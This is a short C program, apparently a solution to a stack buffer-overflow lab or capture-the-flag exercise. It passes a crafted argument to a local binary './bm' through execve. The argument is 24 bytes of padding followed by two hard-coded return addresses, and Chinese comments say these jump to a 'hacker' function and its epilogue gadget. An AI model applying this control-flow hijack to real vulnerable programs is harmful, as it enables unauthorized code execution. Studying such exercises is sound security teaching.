#include <stdio.h>
#include <string.h>
#include <unistd.h>

char code[] = "0123456789abcdef12341234"      // 24字节填充
              "\xd4\x06\x00\x20\x01\x00\x00\x00"  // 1. 跳转到 hacker 的核心逻辑
              "\x28\x07\x00\x20\x01\x00\x00\x00"; // 2. 为 hacker 的"尾声gadget"准备的返回地址

int main()
{
    char *arg[3];
    arg[0] = "./bm";
    arg[1] = code;
    arg[2] = NULL;
    execve(arg[0], arg, NULL);
    return 0;
}